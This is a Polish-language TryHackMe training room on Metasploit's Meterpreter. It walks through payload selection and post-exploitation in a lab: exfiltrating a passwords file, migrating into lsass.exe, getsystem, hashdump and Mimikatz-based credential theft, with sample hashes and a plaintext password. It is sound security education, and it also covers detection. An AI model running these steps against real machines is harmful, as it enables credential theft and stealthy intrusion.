---

W poprzednim pokoju,[Metasploit:Skanowanie i eksploatacja](https://tryhackme.com/room/metasploitscanningandexploitation) , wykorzystałeś STRATFORD-WS01 za pomocą EternalBlue i wylądowałeś w sesji interaktywnej. W wierszu poleceń widniał komunikat `meterpreter >`, wpisałeś `getuid`, a cel odpowiedział `NT AUTHORITY\SYSTEM`. Wyglądało to jak wiersz poleceń, ale ewidentnie nim nie było `cmd.exe`. `/bin/bash`Czym właściwie jest Meterpreter i dlaczego Metasploit traktuje go jako domyślny ładunek dla większości exploitów?

## Czym jest Meterpreter

**Meterpreter** (skrót od „Meta-Interpreter”) to zaawansowany, wielofunkcyjny pakiet, który działa w systemie docelowym i pełni rolę agenta w architekturze poleceń i kontroli (C2). W przeciwieństwie do podstawowej powłoki poleceń, która po prostu przekazuje polecenia systemu operacyjnego w obie strony, Meterpreter zapewnia specjalnie zaprojektowane środowisko z dziesiątkami wyspecjalizowanych poleceń do wykorzystania po ataku: nawigacji w systemie plików, gromadzenia danych uwierzytelniających, manipulacji procesami, eskalacji uprawnień, przekierowywania i innych.

Rozważ różnicę w ten sposób. Podstawowa powłoka odwrotna zapewnia połączenie z systemem operacyjnym docelowym. Wpisujesz `dir`,System operacyjny Meterpreter uruchamia się `dir`, a dane wyjściowe są zwracane. Meterpreter udostępnia _zestaw narzędzi_ , który działa w pamięci docelowej. Potrafi wykonywać czynności, których żadna sekwencja poleceń systemu operacyjnego nie byłaby w stanie wykonać samodzielnie, takie jak migracja z jednego uruchomionego procesu do innego, wstrzykiwanie bibliotek DLL czy przechwytywanie naciśnięć klawiszy bez zapisywania keyloggera na dysku.

## Jak działa Meterpreter: trzy zasady projektowania

Meterpreter został zaprojektowany z myślą o dyskretnym działaniu i elastyczności. Zrozumienie jego architektury pomaga zrozumieć zarówno jego mocne strony, jak i ograniczenia.

**1. Wykonywanie w pamięci**

**Meterpreter działa w całości w pamięci RAM (Random Access Memory)** docelowego systemu . Nie zapisuje się na dysku jako plik, jak w przypadku `meterpreter.exe`Meterpretera. Zamiast tego, ładunek jest wstrzykiwany do istniejącego, działającego procesu za pomocą techniki zwanej **refleksyjnym wstrzykiwaniem bibliotek DLL** , która ładuje bibliotekę DLL bezpośrednio do pamięci procesu, bez rejestrowania jej za pośrednictwem standardowego interfejsu API ładowania modułów systemu operacyjnego.

Dlaczego to ma znaczenie? Tradycyjne oprogramowanie antywirusowe skanuje głównie _pliki na dysku_ . Podczas pobierania pliku, tworzenia nowego pliku wykonywalnego lub rozpakowywania archiwum, silnik antywirusowy sprawdza nowy plik w swojej bazie sygnatur. Ponieważ Meterpreter nigdy nie tworzy pliku na dysku, omija ten specyficzny mechanizm wykrywania.

Wyobraź sobie następujący przykład. Wykorzystaliśmy lukę STRATFORD-WS01; polecenie `getpid`pokazuje identyfikator procesu, w którym działa Meterpreter:

```
meterpreter > getpidCurrent pid: 1304
```

Jeżeli wyświetlimy uruchomione procesy za pomocą `ps`, PID 1304 to `spoolsv.exe`(usługa Windows Print Spooler), a nie coś o nazwie „Metterpreter”:

Terminal AttackBox

```shell-session
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 692   596   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 716   596   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 1304  692   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 [...]
```

Do każdego, kto przegląda listę procesów,PID1304 wygląda na legalny bufor wydruku. Nie ma żadnego `meterpreter.exe`pliku na dysku, żadnej podejrzanej nazwy procesu ani pliku do przeskanowania.

**2. Szyfrowana komunikacja**

Cały ruch pomiędzyMeterpretera Twój atakujący komputer jest **zaszyfrowany** . W zależności od wariantu ładunku, może on wykorzystywać szyfrowanie TLS (dla Meterpreterów opartych na protokole HTTPS) lub AES (dla wariantów opartych na protokole TCP). Oznacza to, że sieciowe **systemy wykrywania włamań (IDS)** i **systemy zapobiegania włamaniom (IPS)** nie mogą przejrzeć ruchu poleceń ładunku bez jego wcześniejszego odszyfrowania.

Jeżeli organizacja docelowa nie przeprowadza inspekcji TLS w ruchu wychodzącym (a wiele organizacji tego nie robi), komunikacja międzyMeterpretersesja i atakująca maszyna będą widoczne dla narzędzi monitorujących sieć jako zwykły, zaszyfrowany ruch sieciowy.

**3. Rozszerzalność poprzez ładowanie**

Meterpreterjest modułowy. Jego rdzeń jest celowo mały; dodatkowe możliwości są ładowane na żądanie za pomocą polecenia `load`. Po wpisaniu `load kiwi`(aby załadować rozszerzenie do zbierania danych uwierzytelniających oparte na Mimikatz), rozszerzenie jest przesyłane do celu i ładowane doMeterpreterprzestrzeń pamięci, również bez zapisywania na dysku.

Ten projekt oznaczaMeterpreterPoczątkowy rozmiar jest minimalny. Do celu przesyłane są tylko funkcje, których faktycznie potrzebujesz, co zmniejsza zarówno powierzchnię detekcji, jak i ruch sieciowy.

## Uczciwe ograniczenia

Meterpreterjest potężny, ale nie niewidoczny. Nowoczesne **wykrywanie i reagowanie na punkty końcowe (EDR)** rozwiązania wykraczają daleko poza proste skanowanie plików:

- **Detekcja behawioralna** monitoruje wzorce aktywności procesów. RefleksyjnaBiblioteka DLLwstrzykiwanie, migracja procesów i zrzucanie poświadczeń to dobrze znane zachowania, któreEDRprodukty aktywnie oznaczane flagą.
- **Skanowanie pamięci** polega na badaniu pamięci procesów w celu wykrycia znanych złośliwych sygnatur, co pozwala na wykrycie wstrzykniętych ładunków, które nigdy nie miały kontaktu z dyskiem.
- **AMSI(Antimalware Scan Interface)** w nowoczesnych systemach Windows potrafi sprawdzać skrypty i ładunki w czasie wykonywania, nawet gdy są załadowane w pamięci.

W dobrze chronionym środowisku przedsiębiorstwa domyślneMeterpreterładunek prawdopodobnie zostanie wykryty. Techniki, które omawiamy w tej sali, stanowią podstawę, ale rzeczywiste działania przeciwko dojrzałym programom bezpieczeństwa wymagają dodatkowych strategii unikania, wykraczających poza zakres tego modułu.

W przypadku naszego zaangażowania w Stratford Systems środowisko laboratoryjne nie maEDRrozmieszczone, więcMeterpreterbędzie działać bez zakłóceń. Dzięki temu możemy skupić się na nauce komend i technik, nie narażając się jednocześnie na wykrycie.

Właśnie widziałeś Meterpreter uruchamiany na docelowym systemie Windows jako system refleksyjny Biblioteka DLL Wstrzykiwane do `spoolsv.exe`. Ale co, jeśli Twoim celem jest serwer Linux bez modułu ładującego biblioteki DLL systemu Windows? Albo aplikacja internetowa z PHP? Meterpreter to nie pojedynczy plik binarny; to rodzina implementacji, z których każda została stworzona dla innej platformy i środowiska wykonawczego. Wybór odpowiedniej implementacji to decyzja, którą będziesz podejmować przy każdym projekcie. 

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Zadania 2-4 mają głównie charakter teoretyczny. Zdobytą w nich wiedzę zastosujesz w wyzwaniu na końcu. 

## Implementacje Meterpretera

Metasploit dostarcza Meterpretera w kilku implementacjach specyficznych dla danej platformy:

**Windows Meterpreter** to oryginalna i najbogatsza w funkcje wersja. Wykorzystuje on mechanizm refleksyjnego wstrzykiwania bibliotek DLL i oferuje pełen zestaw poleceń: `migrate`, `hashdump`, `getsystem`, `load kiwi`, przechwytywanie naciśnięć klawiszy, zrzut ekranu, dostęp do kamery internetowej i wiele innych. Jeśli Twoim systemem docelowym jest system Windows, jest to domyślne i prawie zawsze właściwe rozwiązanie.

**Mettle** (Linux, macOS i inne systemy POSIX) to wieloplatformowy odpowiednik Meterpretera. Napisany w C, Mettle zapewnia podstawową funkcjonalność Meterpretera (system plików, sieć, zarządzanie procesami) w systemach Linux, macOS, BSD i systemach wbudowanych. Nie obsługuje funkcji specyficznych dla systemu Windows, takich jak `hashdump`lub `getsystem`, ale zapewnia wszystko, czego potrzeba do późniejszej eksploatacji na systemach Unix.

**Java Meterpreter** działa w wirtualnej maszynie Java (JVM). Jest to przydatne, gdy exploit atakuje aplikację Java (np. Apache Tomcat lub serwer Jenkins) i można wstrzyknąć ładunek Java. Jest niezależny od platformy, ale ma mniejszy zestaw poleceń niż implementacje natywne.

**PHP Meterpreter** działa jako zinterpretowany kod PHP w środowisku wykonawczym PHP serwera WWW. Jest to najlepszy wybór w przypadku korzystania z aplikacji internetowych opartych na PHP (WordPress, Joomla, niestandardowe aplikacje PHP). Jest to najbardziej ograniczona wersja Meterpretera, bez migracji procesów ani natywnej integracji z systemem operacyjnym, ale zapewnia dostęp do systemu plików, wykonywanie poleceń i funkcje odwrotnej powłoki w kontekście serwera WWW.

**Python Meterpreter** działa w oparciu o zinterpretowany kod Pythona. Podobnie jak PHP Meterpreter, zależy od tego, czy na komputerze docelowym jest zainstalowany Python. Stanowi rozwiązanie pośrednie między ograniczoną wersją PHP a w pełni funkcjonalnymi implementacjami natywnymi.

## Trójczynnikowy model decyzyjny

Wybierając ładunek Meterpretera, należy kierować się trzema czynnikami:

**Czynnik 1: Docelowy system operacyjny**

To jest filtr podstawowy. Jeśli na komputerze docelowym działa system Windows (lub jego odpowiednik x86), należy zastosować filtr `windows/x64/meterpreter/reverse_tcp`. Jeśli na komputerze docelowym działa system Linux, należy zastosować filtr `linux/x64/meterpreter/reverse_tcp`. System operacyjny określa, która implementacja zostanie uruchomiona na komputerze docelowym.

**Czynnik 2: Dostępne komponenty na celu**

Jeśli wykorzystujesz aplikację internetową PHP, cel ma dostępny interpreter PHP; użyj PHPMeterpreterJeśli wykorzystujesz serwer aplikacji Java, użyj JavaMeterpreterImplementacja musi odpowiadać temu, co cel może faktycznie _uruchomić_ . Nie można wstrzyknąć biblioteki DLL systemu Windows doLinuxprocesu i nie możesz uruchomić PHPMeterpreterna komputerze docelowym, na którym nie zainstalowano PHP.

**Czynnik 3: Typ połączenia**

Meterpreterobsługuje kilka metod połączenia:

- **reverse_tcp** : Cel łączy się z Twoim komputerem na określonym porcie. Najbardziej powszechna i niezawodna metoda.
- **reverse_http / reverse_https** : Cel łączy się z powrotem przez HTTP lub HTTPS. Przydatne, gdy zapora sieciowa celu zezwala tylko na ruch wychodzący.
- **bind_tcp** :Meterpreternasłuchuje na porcie docelowym, a Ty się z nim łączysz. Przydatne, gdy docelowy obiekt nie może inicjować połączeń wychodzących (np. za zaporą sieciową o ścisłym ruchu wychodzącym).

W większości scenariuszy `reverse_tcp`jest to ustawienie domyślne i właściwy wybór. Używaj go `reverse_https`, gdy chcesz zmieszać się z ruchem sieciowym lub ominąć filtrowanie ruchu wychodzącego. Używaj go `bind_tcp`tylko wtedy, gdy połączenia zwrotne nie są możliwe.

## Przykłady rozwiązań

Zastosujmy te ramy do trzech scenariuszy z zaangażowania Stratford Systems:

**Scenariusz 1** : Wykorzystujesz lukę w zabezpieczeniach EternalBlue na komputerze STRATFORD-WS01 (Windows 7, x64).

- System operacyjny: Windows →`windows/x64/meterpreter/...`
- Składniki: Pełne WindowsSystem operacyjny→ rodzimyMeterpreter(wstrzykiwanie DLL)
- Połączenie: Brak ograniczeń wyjścia →`reverse_tcp`
- **Ładunek** :`windows/x64/meterpreter/reverse_tcp`

**Scenariusz 2** : Odkryłeś lukę w zabezpieczeniach umożliwiającą przesyłanie danych w aplikacji internetowej PHP na serwerze Linux.

- System operacyjny: Linux, ale exploit działa poprzez PHP →`php/meterpreter/...`
- Składniki:PHPdostępne środowisko wykonawcze (to jestPHPaplikacja) →PHP Meterpreter
- Połączenie: Serwer WWW prawdopodobnie zezwala na wychodzący protokół HTTP → `reverse_tcp`(lub `reverse_http`jeśli jest to ścisłe)
- **Ładunek** :`php/meterpreter/reverse_tcp`

**Scenariusz 3** : Twoim celem jest serwer Jenkins (Java) na hoście wewnętrznym, który blokuje cały ruch wychodzący z wyjątkiem ruchu HTTPS na porcie 443.

- OS: Atak ten ma na celu aplikację Java →`java/meterpreter/...`
- Komponenty: Dostępna JVM (jest to aplikacja Java) → JavaMeterpreter
- Połączenie: Tylko HTTPS wychodzące → `reverse_https`z`LPORT 443`
- **Ładunek** :`java/meterpreter/reverse_https`

## Scenizowanie kontra bezscenicznośćMeterpreter

Jak omówiliśmy w sali wprowadzającej,MeterpreterŁadunki występują zarówno w wariantach etapowych, jak i bezetapowych. Konwencja nazewnictwa wskazuje, który z nich:

- `windows/x64/meterpreter/reverse_tcp`— `/`Pomiędzy `meterpreter`a `reverse_tcp`oznacza **etapowanie** . Najpierw łączy się mały stager, a następnie pobiera cały Meterpreter.
- `windows/x64/meterpreter_reverse_tcp`— „ `_`Pomiędzy” `meterpreter`a „bezstopniowo” `reverse_tcp`oznacza **„bezstopniowo”** . Cały Meterpreter jest dostarczany w jednym ładunku.

W przypadku większości `msfconsole`exploitów wersja **etapowa** jest domyślna i działa dobrze. Ładunki bezetapowe są częściej używane podczas generowania samodzielnych plików `msfvenom`(omówionych w następnym pomieszczeniu), gdzie potrzebny jest samodzielny plik binarny, który nie wymaga ponownego pobrania.

## Wyświetlanie dostępnych ładunków Meterpretera

Możesz zobaczyć wszystkie ładunki Meterpretera dostępne w ramach, wyszukując w `msfconsole`:

Terminal AttackBox

```shell-session
msf6 > search type:payload meterpreter

Matching Modules
================

   #    Name                                                 Rank    Description
   -    ----                                                 ----    -----------
   0    payload/android/meterpreter/reverse_http              normal  Android Meterpreter, Reverse HTTP
   1    payload/android/meterpreter/reverse_https             normal  Android Meterpreter, Reverse HTTPS
   2    payload/android/meterpreter/reverse_tcp               normal  Android Meterpreter, Reverse TCP
   [...]
   45   payload/linux/x64/meterpreter/reverse_tcp             normal  Linux Mettle x64, Reverse TCP Stager
   46   payload/linux/x64/meterpreter_reverse_http            normal  Linux Meterpreter, Reverse HTTP Inline
   [...]
   112  payload/windows/x64/meterpreter/reverse_tcp           normal  Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
   113  payload/windows/x64/meterpreter_reverse_tcp           normal  Windows Meterpreter Shell, Reverse TCP Inline
   [...]
```

Pełna lista zawiera ponad 100 wpisów dla wszystkich platform i typów połączeń. Nie musisz ich zapamiętywać. Trójskładnikowy framework (System operacyjny→ komponenty → połączenia) zawsze pomoże Ci dokonać właściwego wyboru.

Jesteś na stacji roboczej Stratford Systems. Witryna `meterpreter >`czeka. Zanim zaczniesz szukać poświadczeń lub zwiększać uprawnienia, musisz odpowiedzieć na trzy podstawowe pytania: _Gdzie jestem? Kim jestem? Co znajduje się na tym komputerze?_

MeterpreterMa dziesiątki wbudowanych poleceń. Zamiast wymieniać je alfabetycznie (zawsze możesz to zrobić wpisując `help`), to zadanie porządkuje je według wykonywanego zadania. Każde zaprezentowane tutaj polecenie działa bezpośrednio w sesji Meterpretera, bez ładowania dodatkowych rozszerzeń ani zapisywania plików na dysku.

## Świadomość sytuacyjna

Polecenia te informują o systemie, w którym się znajdujesz, i kontekście, w którym działasz.

**sysinfo** — Wyświetla nazwę hosta, system operacyjny, architekturę i domenę celu:

Terminal AttackBox

```shell-session
meterpreter > sysinfo
Computer        : STRATFORD-WS01
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : STRATFORD
Logged On Users : 2
Meterpreter     : x64/windows
```

To zazwyczaj pierwsze polecenie, które uruchamiasz po lądowaniu. Potwierdza ono cel.System operacyjny, architekturę i przynależność do domeny w jednym wyjściu.

**getuid** — Pokazuje konto użytkownikaMeterpreterdziała jako:

Terminal AttackBox

```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`NT AUTHORITY\SYSTEM`to najwyższy poziom uprawnień w systemie Windows. Jeśli widzisz tu zwykłe konto użytkownika (np. `STRATFORD\svc_backup`), musisz zwiększyć uprawnienia, aby uzyskać dostęp do poufnych danych, takich jak skróty haseł.

**getpid** — Zwraca identyfikator procesu, w którym aktualnie działa Meterpreter:

Terminal AttackBox

```shell-session
meterpreter > getpid
Current pid: 1304
```

**ps** — Wyświetla listę wszystkich uruchomionych procesów na serwerze docelowym. Jest to przydatne do identyfikacji procesów, do których można migrować, znajdowania interesujących aplikacji (przeglądarek, klientów poczty e-mail, menedżerów haseł) i potwierdzania bieżącego kontekstu procesu:

Terminal AttackBox

```shell-session
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 692   596   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 716   596   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 1304  692   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1540  692   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 [...]
```

Możemy zauważyć kilka przydatnych szczegółów:Meterpreterjest wPID1304 ( `spoolsv.exe`), `lsass.exe`ma PID 716 (będzie nam to potrzebne później do zrzutu poświadczeń), a użytkownik `ballen`ma aktywną sesję pulpitu z uruchomionym programem `explorer.exe`i `notepad.exe`.

**idletime** — Pokazuje, jak długo zdalny użytkownik był bezczynny:

Terminal AttackBox

```shell-session
meterpreter > idletime
User has been idle for: 1 hour 23 mins 14 secs
```

Jeśli obawiasz się, że użytkownik zauważy Twoją aktywność (zmiany ekranu, ruch kursora podczas migracji), ta funkcja poinformuje Cię, czy ktoś aktywnie korzysta z klawiatury.

## Operacje w systemie plików

Polecenia te umożliwiają nawigację i interakcję z systemem plików docelowym.

**pwd, cd, ls** — Poruszaj się po katalogach tak jak w terminalu Linux:

Terminal AttackBox

```shell-session
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:\Users\ballen\Desktop
meterpreter > ls

Listing: C:\Users\ballen\Desktop
=================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2026-01-15 09:22:18 +0000  desktop.ini
100666/rw-rw-rw-  38    fil   2026-02-20 14:05:33 +0000  notes.txt
100666/rw-rw-rw-  2048  fil   2026-03-01 11:42:07 +0000  budget_q1.xlsx
```

**cat** — Wyświetla zawartość pliku:

Terminal AttackBox

```shell-session
meterpreter > cat C:\Users\ballen\Desktop\notes.txt
VPN credentials - ask IT for reset
Backup server: 10.49.14.60
```

**wyszukiwanie** — przeszukuje cały system plików (lub konkretny katalog) w celu znalezienia plików pasujących do wzorca:

Terminal AttackBox

```shell-session
meterpreter > search -f *.txt -d C:\Users
Found 3 results...
    C:\Users\ballen\Desktop\notes.txt (38 bytes)
    C:\Users\ballen\Documents\passwords.txt (124 bytes)
    C:\Users\Public\readme.txt (892 bytes)
```

Flaga `-f`określa wzorzec pliku (obsługiwane są symbole wieloznaczne) i `-d`ogranicza wyszukiwanie do określonego drzewa katalogów. Bez niej `-d`Meterpreter przeszukuje cały system plików, co może być powolne.

**pobieranie i przesyłanie** — przesyłanie plików między komputerem docelowym a Twoim:

Terminal AttackBox

```shell-session
meterpreter > download C:\Users\ballen\Documents\passwords.txt /home/kali/loot/
[*] Downloading: C:\Users\ballen\Documents\passwords.txt -> /home/kali/loot/passwords.txt
[*] Downloaded 124.00 B of 124.00 B (100.0%): passwords.txt -> /home/kali/loot/passwords.txt
```

Terminal AttackBox

```shell-session
meterpreter > upload /home/kali/tools/winPEAS.exe C:\Temp\
[*] Uploading  : /home/kali/tools/winPEAS.exe -> C:\Temp\winPEAS.exe
[*] Uploaded 1.87 MiB of 1.87 MiB (100.0%): winPEAS.exe -> C:\Temp\winPEAS.exe
```

## Sieciowanie

Polecenia te zapewniają wgląd w konfigurację sieci i połączenia docelowe.

**ifconfig** — Wyświetla interfejsy sieciowe celu:

Terminal AttackBox

```shell-session
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1

Interface 11
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 02:ce:59:27:c8:e3
MTU          : 1500
IPv4 Address : MACHINE_IP
IPv4 Netmask : 255.255.255.0
```

Jeśli cel ma wiele interfejsów sieciowych (np. jeden podłączony do sieci wewnętrznej, a drugi do sieci VLAN zarządzania), w ten sposób można odkryć możliwości pivot.

**netstat** — Pokazuje aktywne połączenia sieciowe, ujawniając, z czym komunikuje się cel:

Terminal AttackBox

```shell-session
meterpreter > netstat

Connection list
===============

    Proto  Local address       Remote address      State        User  Inode  PID/Program name
    -----  -------------       --------------      -----        ----  -----  ----------------
    tcp    MACHINE_IP:139      0.0.0.0:*           LISTEN       0     0      4/System
    tcp    MACHINE_IP:445      0.0.0.0:*           LISTEN       0     0      4/System
    tcp    MACHINE_IP:49186    CONNECTION_IP:4444   ESTABLISHED  0     0      1304/spoolsv.exe
    [...]
```

Możemy zobaczyć nasze własneMeterpreterpołączenie ( `10.10.14.12:4444`) na liście ESTABLISHED. W rzeczywistym starciu należy również szukać połączeń z wewnętrznymi bazami danych, udziałami plików lub innymi systemami, które mogą być celami pivot.

## Interakcja z systemem operacyjnym

**shell** — przenosi Cię do powłoki natywnego systemu operacyjnego na komputerze docelowym:

Terminal AttackBox

```shell-session
meterpreter > shell
Process 2880 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Jesteś teraz `cmd.exe`na celu. Jest to przydatne, gdy musisz uruchomić polecenie systemu Windows, dla którego Meterpreter nie ma wbudowanego odpowiednika. Wpisz `exit`, aby powrócić doMeterpreterpodpowiedź.

**„execute”** — uruchamia polecenie na obiekcie docelowym bez przechodzenia do powłoki. Flaga `-f`określa polecenie i `-i`sprawia, że ​​staje się ono interaktywne:

Terminal AttackBox

```shell-session
meterpreter > execute -f ipconfig -i
Process 2912 created.
Channel 2 created.

Windows IP Configuration

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : MACHINE_IP
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.49.14.1
```

## Polecenie Pomocy

W tym zadaniu omówiono polecenia, których będziesz używać najczęściej.Meterpreterma o wiele więcej. Wpisanie `help`dowolnego wiersza poleceń Meterpretera wyświetla pełną listę poleceń uporządkowaną według kategorii:

Terminal AttackBox

```shell-session
meterpreter > help

Core Commands
=============
    Command       Description
    -------       -----------
    background    Backgrounds the current session
    exit          Terminate the Meterpreter session
    help          Displays the help menu
    migrate       Allows you to migrate Meterpreter to another process
    run           Executes a Meterpreter script or Post module
    sessions      Quickly switch to another session

[...File system commands, Networking commands, System commands, etc.]
```

KażdyMeterpreterWersja ma inny zestaw poleceń. Wersja dla systemu Windows zawiera polecenia dostępu do kamery internetowej, przechwytywania naciśnięć klawiszy i robienia zrzutów ekranu, których nie ma w wersji dla systemu Linux (Mettle). Zawsze uruchamiaj `help`po nawiązaniu sesji, aby sprawdzić, co dokładnie jest dostępne.

W poprzednim zadaniu nauczyłeś się, jak się rozglądać: sprawdzać informacje systemowe, nawigować po plikach i badać połączenia sieciowe. Teraz skupiasz się na _działaniu_ w oparciu o to, co znajdziesz. Po eksploatowaniu systemu zwiększasz uprawnienia, zbierasz dane uwierzytelniające, ładujesz specjalistyczne narzędzia i wykorzystujesz…Metasploitmodułów poeksploatacyjnych za pośrednictwem istniejącej sesji.

## Migracja procesów

**Migracja** to akt przeniesienia swojego Meterpreter sesji z jednego procesu do drugiego w systemie docelowym. To jedna z najważniejszych technik, które należy zrozumieć, ponieważ wpływa ona zarówno na stabilność, jak i poziom uprawnień.

Dlaczego migrować? Kilka powodów:

- **Stabilność** : Jeśli Meterpreter działa w ramach procesu, który użytkownik lub system może zamknąć (np. przeglądarka lub usługa, która uruchamia się ponownie), a migracja do procesu o długim czasie trwania (np. `explorer.exe`lub `svchost.exe`) utrzymuje sesję przy życiu.
- **Kontekst uprawnień** : Twoja sesja Meterpretera dziedziczy uprawnienia procesu, w którym się znajduje. Migracja do procesu uruchomionego jako inny użytkownik zmienia Twoje efektywne uprawnienia.
- **Dostęp do możliwości** : Niektóre operacje wymagają działania w ramach określonego procesu. Na przykład przechwytywanie naciśnięć klawiszy z pulpitu użytkownika wymaga migracji do procesu w sesji tego użytkownika (np. `explorer.exe`).

Polecenie `migrate`przyjmuje identyfikator procesu docelowego:

Terminal AttackBox

```shell-session
meterpreter > getpid
Current pid: 1304
meterpreter > ps

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 716   596   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 1304  692   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 [...]

meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 716
```

Meterpreter przeniesiono z `spoolsv.exe`(PID 1304) do `lsass.exe`(PID716). Ponieważ `lsass.exe`jest to usługa podsystemu lokalnego urzędu bezpieczeństwa, która obsługuje uwierzytelnianie, migracja w tym miejscu jest powszechnym warunkiem wstępnym do zrzucenia poświadczeń.

**Ważne ostrzeżenie** : migracja jest operacją jednokierunkową i może zmienić poziom uprawnień. Migracja z procesu SYSTEM do procesu uruchomionego jako zwykły użytkownik powoduje _utratę_ uprawnień SYSTEM. Zawsze sprawdzaj `getuid`po migracji, czy poziom uprawnień nie spadł:

Terminal AttackBox

```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Nadal SYSTEM, ponieważ `lsass.exe`działa jako SYSTEM. Gdybyśmy przenieśli się do `explorer.exe`(PID 2044, działający jako `STRATFORD\ballen`), poziom uprawnień spadłby do tego użytkownika.

### Eskalacja uprawnień za pomocą Getsystem

Polecenie `getsystem`próbuje zwiększyć Twoje uprawnienia, `NT AUTHORITY\SYSTEM`wykorzystując kilka wbudowanych technik (podszywanie się pod nazwany potok, duplikacja tokenów):

Terminal AttackBox

```shell-session
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`getsystem`Działa, gdy bieżący użytkownik ma uprawnienia administratora lokalnego, ale nie działa jeszcze jako SYSTEM. To szybka, wbudowana eskalacja uprawnień, która obejmuje najczęstszy scenariusz. Jeśli się nie powiedzie (obiekt docelowy może mieć wdrożone zabezpieczenia lub użytkownik może nie mieć wystarczających uprawnień), konieczne będzie zapoznanie się z innymi ścieżkami eskalacji, które omówiono w module „Eskalacja uprawnień” w dalszej części tej ścieżki szkoleniowej.

## Zbieranie poświadczeń za pomocą Hashdump

Polecenie `hashdump`wyodrębnia skróty lokalnych kont użytkowników z bazy danych SAM (Security Account Manager) obiektu docelowego:

Terminal AttackBox

```shell-session
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ballen:1001:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
jchambers:1002:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
```

Każdy wiersz ma format `username:RID:LM_hash:NTLM_hash:::`. Skrót NTLM (czwarte pole) to ten, z którym zazwyczaj będziesz pracować podczas łamania zabezpieczeń lub ataków typu pass-the-hash.

`hashdump` **Wymaga uprawnień SYSTEM** . Jeśli używasz programu jako zwykły użytkownik, polecenie zakończy się niepowodzeniem z błędem odmowy dostępu. Typowy schemat działania wygląda następująco: sprawdź `getuid`→ jeśli nie SYSTEM, spróbuj `getsystem`→ jeśli to się nie powiedzie, przenieś do procesu SYSTEM, np. `lsass.exe`→ a następnie uruchom `hashdump`.

## Ładowanie rozszerzeń: Kiwi

Polecenie Meterpretera `load`dodaje moduły rozszerzeń do bieżącej sesji. Najbardziej znanym rozszerzeniem jest **Kiwi** , które wprowadza funkcje zbierania danych uwierzytelniających w stylu Mimikatz bezpośrednio do…Meterpreter.

Terminal AttackBox

```shell-session
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

Success.
```

Po załadowaniu w `help`menu pojawiają się nowe polecenia. Najbardziej przydatne jest polecenie `creds_all`, które pobiera wszystkie dostępne dane uwierzytelniające z pamięci docelowej:

Terminal AttackBox

```shell-session
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username   Domain     NTLM                              SHA1
--------   ------     ----                               ----
ballen     STRATFORD  e02bc503339d51f71d913c245d35b50b   a]4f2d7b24e0f1c7...

wdigest credentials
===================

Username   Domain     Password
--------   ------     --------
ballen     STRATFORD  Password1

[...]
```

Zauważ, że **hasło** do konta `creds_all`zostało pobrane w postaci jawnego tekstu za pomocą danych logowania WDigest. W starszych systemach Windows (przed Windows 8.1/Server 2012 R2 bez KB2871997) WDigest domyślnie przechowuje hasła w postaci jawnego tekstu w pamięci. Jest to kluczowe odkrycie w każdym przypadku.`ballen`

